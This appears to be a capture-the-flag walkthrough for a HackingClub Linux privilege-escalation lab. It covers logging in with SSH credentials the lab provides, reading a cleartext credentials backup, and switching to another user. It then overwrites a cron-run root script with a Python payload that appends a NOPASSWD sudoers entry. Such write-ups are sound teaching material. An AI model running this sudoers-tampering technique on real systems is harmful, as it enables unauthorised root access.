# Privesc Linux - 2

## Overview

Linux privilege escalation lab from HackingClub.  
Goal: obtain root access and capture both flags.

**User flag:** `hackingclub{l4t...}`  
**Root flag:** `hackingclub{cr0t...}`

Full walkthrough and screenshots are available in the attached PDF:  
[Privesc_Linux_-_2.pdf](Privesc_Linux_-_2.pdf)

## How I solved it

### 1. Initial Access
The lab provides SSH credentials.

```bash
ssh ctfplayer@<IP_MACHINE>
# password: ctfplayer2026
```

### 2. Enumeration
After logging in as `ctfplayer`, I enumerated the home directory and found hidden files:

```bash
ls -la ~
```

Inside `~/.config/app/` there was a backup file:

```bash
cat ~/.config/app/.credentials.bak
```

This file contained cleartext credentials for the `sysadmin` user.

### 3. Lateral Movement
```bash
su sysadmin
cd ~
cat user.txt
```

This gave the user flag: `hackingclub{l4t...}`

The `notes.txt` file mentioned an automatic backup script and recommended reviewing permissions in `/opt/scripts`.

### 4. Privilege Escalation
The script `/opt/scripts/backup.py` is executed periodically via cron (approximately every minute) with elevated privileges.

I overwrote the script with a payload that adds `sysadmin` to sudoers:

```python
import os
os.system("echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
```

After waiting for the cron job to run:

```bash
sudo su
whoami
# root
```

### 5. Root Flag
```bash
cat /root/root.txt
```

Root flag: `hackingclub{cr0t...}`

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Initial Access | SSH with provided credentials | `ctfplayer` |
| Enumeration | Hidden file `.credentials.bak` | `sysadmin` password |
| Lateral Movement | `su sysadmin` | User flag |
| Escalation | Overwrite cron-executed `backup.py` | Root via sudoers |
| Root | `sudo su` | Root flag |
